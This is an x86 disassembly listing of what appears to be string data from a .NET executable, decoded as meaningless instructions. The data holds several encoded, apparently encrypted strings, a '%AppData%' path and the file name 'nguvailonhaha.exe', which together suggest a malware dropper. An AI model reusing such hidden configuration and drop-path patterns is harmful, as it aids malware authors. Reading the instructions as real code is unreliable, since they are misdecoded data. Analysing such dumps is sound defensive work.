  409f8d:	43                   	inc    %ebx
  409f8e:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f91:	43                   	inc    %ebx
  409f92:	00 52 00             	add    %dl,0x0(%edx)
  409f95:	4a                   	dec    %edx
  409f96:	00 68 00             	add    %ch,0x0(%eax)
  409f99:	35 00 4f 00 34       	xor    $0x34004f00,%eax
  409f9e:	00 49 00             	add    %cl,0x0(%ecx)
  409fa1:	76 00                	jbe    0x409fa3
  409fa3:	50                   	push   %eax
  409fa4:	00 35 00 31 00 49    	add    %dh,0x49003100
  409faa:	00 52 00             	add    %dl,0x0(%edx)
  409fad:	75 00                	jne    0x409faf
  409faf:	34 00                	xor    $0x0,%al
  409fb1:	39 00                	cmp    %eax,(%eax)
  409fb3:	71 00                	jno    0x409fb5
  409fb5:	73 00                	jae    0x409fb7
  409fb7:	38 00                	cmp    %al,(%eax)
  409fb9:	4a                   	dec    %edx
  409fba:	00 6f 00             	add    %ch,0x0(%edi)
  409fbd:	73 00                	jae    0x409fbf
  409fbf:	74 00                	je     0x409fc1
  409fc1:	57                   	push   %edi
  409fc2:	00 42 00             	add    %al,0x0(%edx)
  409fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  409fc6:	00 52 00             	add    %dl,0x0(%edx)
  409fc9:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  409fcd:	6b 00 52             	imul   $0x52,(%eax),%eax
  409fd0:	00 4d 00             	add    %cl,0x0(%ebp)
  409fd3:	68 00 61 00 2f       	push   $0x2f006100
  409fd8:	00 4a 00             	add    %cl,0x0(%edx)
  409fdb:	30 00                	xor    %al,(%eax)
  409fdd:	71 00                	jno    0x409fdf
  409fdf:	78 00                	js     0x409fe1
  409fe1:	6e                   	outsb  %ds:(%esi),(%dx)
  409fe2:	00 44 00 77          	add    %al,0x77(%eax,%eax,1)
  409fe6:	00 3d 00 00 80 d9    	add    %bh,0xd9800000
  409fec:	56                   	push   %esi
  409fed:	00 51 00             	add    %dl,0x0(%ecx)
  409ff0:	54                   	push   %esp
  409ff1:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  409ff5:	00 50 00             	add    %dl,0x0(%eax)
  409ff8:	52                   	push   %edx
  409ff9:	00 66 00             	add    %ah,0x0(%esi)
  409ffc:	70 00                	jo     0x409ffe
  409ffe:	48                   	dec    %eax
  409fff:	00 7a 00             	add    %bh,0x0(%edx)
  40a002:	55                   	push   %ebp
  40a003:	00 75 00             	add    %dh,0x0(%ebp)
  40a006:	62 00                	bound  %eax,(%eax)
  40a008:	6e                   	outsb  %ds:(%esi),(%dx)
  40a009:	00 37                	add    %dh,(%edi)
  40a00b:	00 6e 00             	add    %ch,0x0(%esi)
  40a00e:	4e                   	dec    %esi
  40a00f:	00 53 00             	add    %dl,0x0(%ebx)
  40a012:	4b                   	dec    %ebx
  40a013:	00 6d 00             	add    %ch,0x0(%ebp)
  40a016:	66 00 2f             	data16 add %ch,(%edi)
  40a019:	00 48 00             	add    %cl,0x0(%eax)
  40a01c:	61                   	popa
  40a01d:	00 30                	add    %dh,(%eax)
  40a01f:	00 47 00             	add    %al,0x0(%edi)
  40a022:	69 00 4c 00 73 00    	imul   $0x73004c,(%eax),%eax
  40a028:	43                   	inc    %ebx
  40a029:	00 75 00             	add    %dh,0x0(%ebp)
  40a02c:	42                   	inc    %edx
  40a02d:	00 61 00             	add    %ah,0x0(%ecx)
  40a030:	49                   	dec    %ecx
  40a031:	00 68 00             	add    %ch,0x0(%eax)
  40a034:	6c                   	insb   (%dx),%es:(%edi)
  40a035:	00 65 00             	add    %ah,0x0(%ebp)
  40a038:	67 00 74 00          	add    %dh,0x0(%si)
  40a03c:	63 00                	arpl   %eax,(%eax)
  40a03e:	72 00                	jb     0x40a040
  40a040:	59                   	pop    %ecx
  40a041:	00 6e 00             	add    %ch,0x0(%esi)
  40a044:	55                   	push   %ebp
  40a045:	00 69 00             	add    %ch,0x0(%ecx)
  40a048:	77 00                	ja     0x40a04a
  40a04a:	48                   	dec    %eax
  40a04b:	00 31                	add    %dh,(%ecx)
  40a04d:	00 4d 00             	add    %cl,0x0(%ebp)
  40a050:	47                   	inc    %edi
  40a051:	00 46 00             	add    %al,0x0(%esi)
  40a054:	68 00 56 00 74       	push   $0x74005600
  40a059:	00 58 00             	add    %bl,0x0(%eax)
  40a05c:	51                   	push   %ecx
  40a05d:	00 37                	add    %dh,(%edi)
  40a05f:	00 7a 00             	add    %bh,0x0(%edx)
  40a062:	2b 00                	sub    (%eax),%eax
  40a064:	77 00                	ja     0x40a066
  40a066:	63 00                	arpl   %eax,(%eax)
  40a068:	41                   	inc    %ecx
  40a069:	00 51 00             	add    %dl,0x0(%ecx)
  40a06c:	55                   	push   %ebp
  40a06d:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  40a071:	00 5a 00             	add    %bl,0x0(%edx)
  40a074:	4d                   	dec    %ebp
  40a075:	00 68 00             	add    %ch,0x0(%eax)
  40a078:	38 00                	cmp    %al,(%eax)
  40a07a:	61                   	popa
  40a07b:	00 4f 00             	add    %cl,0x0(%edi)
  40a07e:	70 00                	jo     0x40a080
  40a080:	71 00                	jno    0x40a082
  40a082:	70 00                	jo     0x40a084
  40a084:	32 00                	xor    (%eax),%al
  40a086:	32 00                	xor    (%eax),%al
  40a088:	76 00                	jbe    0x40a08a
  40a08a:	49                   	dec    %ecx
  40a08b:	00 58 00             	add    %bl,0x0(%eax)
  40a08e:	50                   	push   %eax
  40a08f:	00 46 00             	add    %al,0x0(%esi)
  40a092:	7a 00                	jp     0x40a094
  40a094:	6b 00 57             	imul   $0x57,(%eax),%eax
  40a097:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a09a:	78 00                	js     0x40a09c
  40a09c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a09d:	00 69 00             	add    %ch,0x0(%ecx)
  40a0a0:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40a0a4:	62 00                	bound  %eax,(%eax)
  40a0a6:	38 00                	cmp    %al,(%eax)
  40a0a8:	79 00                	jns    0x40a0aa
  40a0aa:	53                   	push   %ebx
  40a0ab:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40a0af:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a0b2:	5a                   	pop    %edx
  40a0b3:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40a0b7:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  40a0bb:	00 6f 00             	add    %ch,0x0(%edi)
  40a0be:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0bf:	00 4d 00             	add    %cl,0x0(%ebp)
  40a0c2:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  40a0c7:	6d                   	insl   (%dx),%es:(%edi)
  40a0c8:	00 49 00             	add    %cl,0x0(%ecx)
  40a0cb:	33 00                	xor    (%eax),%eax
  40a0cd:	65 00 39             	add    %bh,%gs:(%ecx)
  40a0d0:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  40a0d4:	00 76 00             	add    %dh,0x0(%esi)
  40a0d7:	4c                   	dec    %esp
  40a0d8:	00 57 00             	add    %dl,0x0(%edi)
  40a0db:	2f                   	das
  40a0dc:	00 4b 00             	add    %cl,0x0(%ebx)
  40a0df:	70 00                	jo     0x40a0e1
  40a0e1:	2f                   	das
  40a0e2:	00 50 00             	add    %dl,0x0(%eax)
  40a0e5:	50                   	push   %eax
  40a0e6:	00 4f 00             	add    %cl,0x0(%edi)
  40a0e9:	6b 00 52             	imul   $0x52,(%eax),%eax
  40a0ec:	00 43 00             	add    %al,0x0(%ebx)
  40a0ef:	7a 00                	jp     0x40a0f1
  40a0f1:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40a0f5:	6a 00                	push   $0x0
  40a0f7:	61                   	popa
  40a0f8:	00 50 00             	add    %dl,0x0(%eax)
  40a0fb:	6d                   	insl   (%dx),%es:(%edi)
  40a0fc:	00 4a 00             	add    %cl,0x0(%edx)
  40a0ff:	2f                   	das
  40a100:	00 61 00             	add    %ah,0x0(%ecx)
  40a103:	2b 00                	sub    (%eax),%eax
  40a105:	4d                   	dec    %ebp
  40a106:	00 30                	add    %dh,(%eax)
  40a108:	00 41 00             	add    %al,0x0(%ecx)
  40a10b:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40a10f:	54                   	push   %esp
  40a110:	00 48 00             	add    %cl,0x0(%eax)
  40a113:	77 00                	ja     0x40a115
  40a115:	54                   	push   %esp
  40a116:	00 4a 00             	add    %cl,0x0(%edx)
  40a119:	6f                   	outsl  %ds:(%esi),(%dx)
  40a11a:	00 32                	add    %dh,(%edx)
  40a11c:	00 63 00             	add    %ah,0x0(%ebx)
  40a11f:	59                   	pop    %ecx
  40a120:	00 46 00             	add    %al,0x0(%esi)
  40a123:	43                   	inc    %ebx
  40a124:	00 42 00             	add    %al,0x0(%edx)
  40a127:	2f                   	das
  40a128:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40a12c:	00 50 00             	add    %dl,0x0(%eax)
  40a12f:	77 00                	ja     0x40a131
  40a131:	38 00                	cmp    %al,(%eax)
  40a133:	6e                   	outsb  %ds:(%esi),(%dx)
  40a134:	00 51 00             	add    %dl,0x0(%ecx)
  40a137:	50                   	push   %eax
  40a138:	00 4a 00             	add    %cl,0x0(%edx)
  40a13b:	53                   	push   %ebx
  40a13c:	00 52 00             	add    %dl,0x0(%edx)
  40a13f:	69 00 51 00 4d 00    	imul   $0x4d0051,(%eax),%eax
  40a145:	58                   	pop    %eax
  40a146:	00 63 00             	add    %ah,0x0(%ebx)
  40a149:	39 00                	cmp    %eax,(%eax)
  40a14b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a14c:	00 61 00             	add    %ah,0x0(%ecx)
  40a14f:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40a153:	42                   	inc    %edx
  40a154:	00 4d 00             	add    %cl,0x0(%ebp)
  40a157:	6a 00                	push   $0x0
  40a159:	63 00                	arpl   %eax,(%eax)
  40a15b:	56                   	push   %esi
  40a15c:	00 73 00             	add    %dh,0x0(%ebx)
  40a15f:	4c                   	dec    %esp
  40a160:	00 48 00             	add    %cl,0x0(%eax)
  40a163:	49                   	dec    %ecx
  40a164:	00 71 00             	add    %dh,0x0(%ecx)
  40a167:	4c                   	dec    %esp
  40a168:	00 63 00             	add    %ah,0x0(%ebx)
  40a16b:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40a16f:	68 00 41 00 3d       	push   $0x3d004100
  40a174:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a17a:	37                   	aaa
  40a17b:	00 39                	add    %bh,(%ecx)
  40a17d:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  40a181:	00 78 00             	add    %bh,0x0(%eax)
  40a184:	76 00                	jbe    0x40a186
  40a186:	45                   	inc    %ebp
  40a187:	00 42 00             	add    %al,0x0(%edx)
  40a18a:	71 00                	jno    0x40a18c
  40a18c:	77 00                	ja     0x40a18e
  40a18e:	52                   	push   %edx
  40a18f:	00 32                	add    %dh,(%edx)
  40a191:	00 33                	add    %dh,(%ebx)
  40a193:	00 72 00             	add    %dh,0x0(%edx)
  40a196:	6d                   	insl   (%dx),%es:(%edi)
  40a197:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  40a19b:	00 50 00             	add    %dl,0x0(%eax)
  40a19e:	56                   	push   %esi
  40a19f:	00 56 00             	add    %dl,0x0(%esi)
  40a1a2:	56                   	push   %esi
  40a1a3:	00 33                	add    %dh,(%ebx)
  40a1a5:	00 75 00             	add    %dh,0x0(%ebp)
  40a1a8:	48                   	dec    %eax
  40a1a9:	00 73 00             	add    %dh,0x0(%ebx)
  40a1ac:	77 00                	ja     0x40a1ae
  40a1ae:	55                   	push   %ebp
  40a1af:	00 6b 00             	add    %ch,0x0(%ebx)
  40a1b2:	59                   	pop    %ecx
  40a1b3:	00 36                	add    %dh,(%esi)
  40a1b5:	00 67 00             	add    %ah,0x0(%edi)
  40a1b8:	69 00 58 00 5a 00    	imul   $0x5a0058,(%eax),%eax
  40a1be:	4a                   	dec    %edx
  40a1bf:	00 5a 00             	add    %bl,0x0(%edx)
  40a1c2:	2b 00                	sub    (%eax),%eax
  40a1c4:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40a1c8:	6d                   	insl   (%dx),%es:(%edi)
  40a1c9:	00 59 00             	add    %bl,0x0(%ecx)
  40a1cc:	30 00                	xor    %al,(%eax)
  40a1ce:	7a 00                	jp     0x40a1d0
  40a1d0:	6d                   	insl   (%dx),%es:(%edi)
  40a1d1:	00 59 00             	add    %bl,0x0(%ecx)
  40a1d4:	33 00                	xor    (%eax),%eax
  40a1d6:	55                   	push   %ebp
  40a1d7:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40a1db:	00 62 00             	add    %ah,0x0(%edx)
  40a1de:	34 00                	xor    $0x0,%al
  40a1e0:	73 00                	jae    0x40a1e2
  40a1e2:	32 00                	xor    (%eax),%al
  40a1e4:	4e                   	dec    %esi
  40a1e5:	00 48 00             	add    %cl,0x0(%eax)
  40a1e8:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40a1ec:	4d                   	dec    %ebp
  40a1ed:	00 61 00             	add    %ah,0x0(%ecx)
  40a1f0:	37                   	aaa
  40a1f1:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  40a1f5:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  40a1f9:	00 36                	add    %dh,(%esi)
  40a1fb:	00 50 00             	add    %dl,0x0(%eax)
  40a1fe:	49                   	dec    %ecx
  40a1ff:	00 32                	add    %dh,(%edx)
  40a201:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40a205:	00 6f 00             	add    %ch,0x0(%edi)
  40a208:	45                   	inc    %ebp
  40a209:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40a20d:	00 6f 00             	add    %ch,0x0(%edi)
  40a210:	72 00                	jb     0x40a212
  40a212:	34 00                	xor    $0x0,%al
  40a214:	69 00 34 00 4f 00    	imul   $0x4f0034,(%eax),%eax
  40a21a:	77 00                	ja     0x40a21c
  40a21c:	39 00                	cmp    %eax,(%eax)
  40a21e:	2b 00                	sub    (%eax),%eax
  40a220:	74 00                	je     0x40a222
  40a222:	73 00                	jae    0x40a224
  40a224:	51                   	push   %ecx
  40a225:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a22b:	13 25 00 41 00 70    	adc    0x70004100,%esp
  40a231:	00 70 00             	add    %dh,0x0(%eax)
  40a234:	44                   	inc    %esp
  40a235:	00 61 00             	add    %ah,0x0(%ecx)
  40a238:	74 00                	je     0x40a23a
  40a23a:	61                   	popa
  40a23b:	00 25 00 00 23 6e    	add    %ah,0x6e230000
  40a241:	00 67 00             	add    %ah,0x0(%edi)
  40a244:	75 00                	jne    0x40a246
  40a246:	76 00                	jbe    0x40a248
  40a248:	61                   	popa
  40a249:	00 69 00             	add    %ch,0x0(%ecx)
  40a24c:	6c                   	insb   (%dx),%es:(%edi)
  40a24d:	00 6f 00             	add    %ch,0x0(%edi)
  40a250:	6e                   	outsb  %ds:(%esi),(%dx)
  40a251:	00 68 00             	add    %ch,0x0(%eax)
  40a254:	61                   	popa
  40a255:	00 68 00             	add    %ch,0x0(%eax)
  40a258:	61                   	popa
  40a259:	00 2e                	add    %ch,(%esi)
  40a25b:	00 65 00             	add    %ah,0x0(%ebp)
  40a25e:	78 00                	js     0x40a260
  40a260:	65 00 00             	add    %al,%gs:(%eax)
  40a263:	59                   	pop    %ecx
  40a264:	62 00                	bound  %eax,(%eax)
  40a266:	58                   	pop    %eax
  40a267:	00 42 00             	add    %al,0x0(%edx)
  40a26a:	57                   	push   %edi
  40a26b:	00 63 00             	add    %ah,0x0(%ebx)
  40a26e:	7a 00                	jp     0x40a270
  40a270:	45                   	inc    %ebp
  40a271:	00 30                	add    %dh,(%eax)
  40a273:	00 4f 00             	add    %cl,0x0(%edi)
  40a276:	56                   	push   %esi
  40a277:	00 56 00             	add    %dl,0x0(%esi)
  40a27a:	79 00                	jns    0x40a27c
  40a27c:	63 00                	arpl   %eax,(%eax)
  40a27e:	47                   	inc    %edi
  40a27f:	00 78 00             	add    %bh,0x0(%eax)
  40a282:	74 00                	je     0x40a284
  40a284:	56                   	push   %esi
  40a285:	00 47 00             	add    %al,0x0(%edi)
  40a288:	5a                   	pop    %edx
  40a289:	00 77 00             	add    %dh,0x0(%edi)
  40a28c:	51                   	push   %ecx
  40a28d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a290:	4e                   	dec    %esi
  40a291:	00 36                	add    %dh,(%esi)
  40a293:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40a297:	00 4a 00             	add    %cl,0x0(%edx)
  40a29a:	33 00                	xor    (%eax),%eax
  40a29c:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  40a2a0:	4e                   	dec    %esi
  40a2a1:	00 55 00             	add    %dl,0x0(%ebp)
  40a2a4:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40a2a8:	6c                   	insb   (%dx),%es:(%edi)
  40a2a9:	00 30                	add    %dh,(%eax)
  40a2ab:	00 55 00             	add    %dl,0x0(%ebp)
  40a2ae:	6c                   	insb   (%dx),%es:(%edi)
  40a2af:	00 42 00             	add    %al,0x0(%edx)
  40a2b2:	59                   	pop    %ecx
  40a2b3:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40a2b7:	00 77 00             	add    %dh,0x0(%edi)
  40a2ba:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  40a2bf:	70 00                	jo     0x40a2c1
  40a2c1:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40a2c5:	36 00 38             	add    %bh,%ss:(%eax)
  40a2c8:	00 48 00             	add    %cl,0x0(%eax)
  40a2cb:	4d                   	dec    %ebp
  40a2cc:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  40a2d0:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40a2d4:	00 51 00             	add    %dl,0x0(%ecx)
  40a2d7:	32 00                	xor    (%eax),%al
  40a2d9:	52                   	push   %edx
  40a2da:	00 45 00             	add    %al,0x0(%ebp)
  40a2dd:	49                   	dec    %ecx
  40a2de:	00 35 00 6f 00 63    	add    %dh,0x63006f00
  40a2e4:	00 63 00             	add    %ah,0x0(%ebx)
  40a2e7:	4f                   	dec    %edi
  40a2e8:	00 37                	add    %dh,(%edi)
  40a2ea:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  40a2ee:	00 30                	add    %dh,(%eax)
  40a2f0:	00 32                	add    %dh,(%edx)
  40a2f2:	00 56 00             	add    %dl,0x0(%esi)
  40a2f5:	2f                   	das
  40a2f6:	00 30                	add    %dh,(%eax)
  40a2f8:	00 76 00             	add    %dh,0x0(%esi)
  40a2fb:	57                   	push   %edi
  40a2fc:	00 5a 00             	add    %bl,0x0(%edx)
  40a2ff:	54                   	push   %esp
  40a300:	00 68 00             	add    %ch,0x0(%eax)
  40a303:	44                   	inc    %esp
  40a304:	00 69 00             	add    %ch,0x0(%ecx)
  40a307:	38 00                	cmp    %al,(%eax)
  40a309:	61                   	popa
  40a30a:	00 72 00             	add    %dh,0x0(%edx)
  40a30d:	4b                   	dec    %ebx
  40a30e:	00 2b                	add    %ch,(%ebx)
  40a310:	00 61 00             	add    %ah,0x0(%ecx)
  40a313:	48                   	dec    %eax
  40a314:	00 49 00             	add    %cl,0x0(%ecx)
  40a317:	47                   	inc    %edi
  40a318:	00 6a 00             	add    %ch,0x0(%edx)
  40a31b:	48                   	dec    %eax
  40a31c:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40a320:	00 47 00             	add    %al,0x0(%edi)
  40a323:	7a 00                	jp     0x40a325
  40a325:	35 00 41 00 52       	xor    $0x52004100,%eax
  40a32a:	00 75 00             	add    %dh,0x0(%ebp)
  40a32d:	76 00                	jbe    0x40a32f
  40a32f:	31 00                	xor    %eax,(%eax)
  40a331:	79 00                	jns    0x40a333
  40a333:	41                   	inc    %ecx
  40a334:	00 42 00             	add    %al,0x0(%edx)
  40a337:	37                   	aaa
  40a338:	00 76 00             	add    %dh,0x0(%esi)
  40a33b:	69 00 4d 00 6d 00    	imul   $0x6d004d,(%eax),%eax
  40a341:	47                   	inc    %edi
  40a342:	00 66 00             	add    %ah,0x0(%esi)
  40a345:	30 00                	xor    %al,(%eax)
  40a347:	4b                   	dec    %ebx
  40a348:	00 32                	add    %dh,(%edx)
  40a34a:	00 47 00             	add    %al,0x0(%edi)
  40a34d:	73 00                	jae    0x40a34f
  40a34f:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40a353:	56                   	push   %esi
  40a354:	00 69 00             	add    %ch,0x0(%ecx)
  40a357:	37                   	aaa
  40a358:	00 70 00             	add    %dh,0x0(%eax)
  40a35b:	73 00                	jae    0x40a35d
  40a35d:	59                   	pop    %ecx
  40a35e:	00 46 00             	add    %al,0x0(%esi)
  40a361:	69 00 38 00 33 00    	imul   $0x330038,(%eax),%eax
  40a367:	6e                   	outsb  %ds:(%esi),(%dx)
  40a368:	00 51 00             	add    %dl,0x0(%ecx)
  40a36b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a370:	92                   	xchg   %eax,%edx
  40a371:	59                   	pop    %ecx
  40a372:	6f                   	outsl  %ds:(%esi),(%dx)
  40a373:	00 49 00             	add    %cl,0x0(%ecx)
  40a376:	5a                   	pop    %edx
  40a377:	00 33                	add    %dh,(%ebx)
  40a379:	00 36                	add    %dh,(%esi)
  40a37b:	00 41 00             	add    %al,0x0(%ecx)
  40a37e:	4c                   	dec    %esp
  40a37f:	00 50 00             	add    %dl,0x0(%eax)
  40a382:	39 00                	cmp    %eax,(%eax)
  40a384:	35 00 6d 00 4f       	xor    $0x4f006d00,%eax
  40a389:	00 59 00             	add    %bl,0x0(%ecx)
  40a38c:	78 00                	js     0x40a38e
  40a38e:	35 00 55 00 6f       	xor    $0x6f005500,%eax
  40a393:	00 4b 00             	add    %cl,0x0(%ebx)
  40a396:	69 00 4d 00 6d 00    	imul   $0x6d004d,(%eax),%eax
  40a39c:	4f                   	dec    %edi
  40a39d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a3a0:	56                   	push   %esi
  40a3a1:	00 50 00             	add    %dl,0x0(%eax)
  40a3a4:	71 00                	jno    0x40a3a6
  40a3a6:	75 00                	jne    0x40a3a8
  40a3a8:	38 00                	cmp    %al,(%eax)
  40a3aa:	48                   	dec    %eax
  40a3ab:	00 2f                	add    %ch,(%edi)
  40a3ad:	00 37                	add    %dh,(%edi)
  40a3af:	00 70 00             	add    %dh,0x0(%eax)
  40a3b2:	74 00                	je     0x40a3b4
  40a3b4:	42                   	inc    %edx
  40a3b5:	00 57 00             	add    %dl,0x0(%edi)
  40a3b8:	63 00                	arpl   %eax,(%eax)
  40a3ba:	31 00                	xor    %eax,(%eax)
  40a3bc:	71 00                	jno    0x40a3be
  40a3be:	76 00                	jbe    0x40a3c0
  40a3c0:	75 00                	jne    0x40a3c2
  40a3c2:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  40a3c6:	62 00                	bound  %eax,(%eax)
  40a3c8:	58                   	pop    %eax
  40a3c9:	00 2b                	add    %ch,(%ebx)
  40a3cb:	00 72 00             	add    %dh,0x0(%edx)
  40a3ce:	79 00                	jns    0x40a3d0
  40a3d0:	54                   	push   %esp
  40a3d1:	00 32                	add    %dh,(%edx)
  40a3d3:	00 6e 00             	add    %ch,0x0(%esi)
  40a3d6:	73 00                	jae    0x40a3d8
  40a3d8:	46                   	inc    %esi
  40a3d9:	00 55 00             	add    %dl,0x0(%ebp)
  40a3dc:	5a                   	pop    %edx
  40a3dd:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40a3e1:	00 73 00             	add    %dh,0x0(%ebx)
  40a3e4:	48                   	dec    %eax
  40a3e5:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  40a3e9:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40a3ed:	00 76 00             	add    %dh,0x0(%esi)
  40a3f0:	4a                   	dec    %edx
  40a3f1:	00 52 00             	add    %dl,0x0(%edx)
  40a3f4:	4d                   	dec    %ebp
  40a3f5:	00 67 00             	add    %ah,0x0(%edi)
  40a3f8:	43                   	inc    %ebx
  40a3f9:	00 37                	add    %dh,(%edi)
  40a3fb:	00 78 00             	add    %bh,0x0(%eax)
  40a3fe:	48                   	dec    %eax
  40a3ff:	00 75 00             	add    %dh,0x0(%ebp)
  40a402:	59                   	pop    %ecx
  40a403:	00 48 00             	add    %cl,0x0(%eax)
  40a406:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40a40a:	74 00                	je     0x40a40c
  40a40c:	52                   	push   %edx
  40a40d:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  40a411:	00 56 00             	add    %dl,0x0(%esi)
  40a414:	4c                   	dec    %esp
  40a415:	00 70 00             	add    %dh,0x0(%eax)
  40a418:	56                   	push   %esi
  40a419:	00 6b 00             	add    %ch,0x0(%ebx)
  40a41c:	5a                   	pop    %edx
  40a41d:	00 37                	add    %dh,(%edi)
  40a41f:	00 52 00             	add    %dl,0x0(%edx)
  40a422:	6e                   	outsb  %ds:(%esi),(%dx)
  40a423:	00 35 00 67 00 59    	add    %dh,0x59006700
  40a429:	00 74 00 37          	add    %dh,0x37(%eax,%eax,1)
  40a42d:	00 70 00             	add    %dh,0x0(%eax)
  40a430:	58                   	pop    %eax
  40a431:	00 63 00             	add    %ah,0x0(%ebx)
  40a434:	46                   	inc    %esi
  40a435:	00 5a 00             	add    %bl,0x0(%edx)
  40a438:	4d                   	dec    %ebp
  40a439:	00 70 00             	add    %dh,0x0(%eax)
  40a43c:	4e                   	dec    %esi
  40a43d:	00 51 00             	add    %dl,0x0(%ecx)
  40a440:	62 00                	bound  %eax,(%eax)
  40a442:	55                   	push   %ebp
  40a443:	00 72 00             	add    %dh,0x0(%edx)
  40a446:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  40a44a:	2b 00                	sub    (%eax),%eax
  40a44c:	38 00                	cmp    %al,(%eax)
  40a44e:	48                   	dec    %eax
  40a44f:	00 38                	add    %bh,(%eax)
  40a451:	00 58 00             	add    %bl,0x0(%eax)
  40a454:	35 00 71 00 42       	xor    $0x42007100,%eax
  40a459:	00 58 00             	add    %bl,0x0(%eax)
  40a45c:	4f                   	dec    %edi
  40a45d:	00 35 00 43 00 55    	add    %dh,0x55004300
  40a463:	00 6f 00             	add    %ch,0x0(%edi)
  40a466:	63 00                	arpl   %eax,(%eax)
  40a468:	59                   	pop    %ecx
  40a469:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a46c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a46d:	00 39                	add    %bh,(%ecx)
  40a46f:	00 78 00             	add    %bh,0x0(%eax)
  40a472:	6b 00 46             	imul   $0x46,(%eax),%eax
  40a475:	00 45 00             	add    %al,0x0(%ebp)
  40a478:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  40a47c:	30 00                	xor    %al,(%eax)
  40a47e:	69 00 6d 00 7a 00    	imul   $0x7a006d,(%eax),%eax
  40a484:	47                   	inc    %edi
  40a485:	00 52 00             	add    %dl,0x0(%edx)
  40a488:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40a48c:	4f                   	dec    %edi
  40a48d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a490:	63 00                	arpl   %eax,(%eax)
  40a492:	43                   	inc    %ebx
  40a493:	00 62 00             	add    %ah,0x0(%edx)
  40a496:	37                   	aaa
  40a497:	00 46 00             	add    %al,0x0(%esi)
  40a49a:	56                   	push   %esi
  40a49b:	00 68 00             	add    %ch,0x0(%eax)
  40a49e:	41                   	inc    %ecx
  40a49f:	00 4f 00             	add    %cl,0x0(%edi)
  40a4a2:	58                   	pop    %eax
  40a4a3:	00 32                	add    %dh,(%edx)
  40a4a5:	00 46 00             	add    %al,0x0(%esi)
  40a4a8:	42                   	inc    %edx
  40a4a9:	00 39                	add    %bh,(%ecx)
  40a4ab:	00 7a 00             	add    %bh,0x0(%edx)
  40a4ae:	57                   	push   %edi
  40a4af:	00 71 00             	add    %dh,0x0(%ecx)
  40a4b2:	78 00                	js     0x40a4b4
  40a4b4:	77 00                	ja     0x40a4b6
  40a4b6:	67 00 54 00          	add    %dl,0x0(%si)
  40a4ba:	79 00                	jns    0x40a4bc
  40a4bc:	78 00                	js     0x40a4be
  40a4be:	57                   	push   %edi
  40a4bf:	00 58 00             	add    %bl,0x0(%eax)
  40a4c2:	37                   	aaa
  40a4c3:	00 58 00             	add    %bl,0x0(%eax)
  40a4c6:	4b                   	dec    %ebx
  40a4c7:	00 4f 00             	add    %cl,0x0(%edi)
  40a4ca:	75 00                	jne    0x40a4cc
  40a4cc:	72 00                	jb     0x40a4ce
  40a4ce:	44                   	inc    %esp
  40a4cf:	00 56 00             	add    %dl,0x0(%esi)
  40a4d2:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40a4d6:	4a                   	dec    %edx
  40a4d7:	00 75 00             	add    %dh,0x0(%ebp)
  40a4da:	51                   	push   %ecx
  40a4db:	00 68 00             	add    %ch,0x0(%eax)
  40a4de:	54                   	push   %esp
  40a4df:	00 63 00             	add    %ah,0x0(%ebx)
  40a4e2:	63 00                	arpl   %eax,(%eax)
  40a4e4:	4d                   	dec    %ebp
  40a4e5:	00 76 00             	add    %dh,0x0(%esi)
  40a4e8:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a4ec:	55                   	push   %ebp
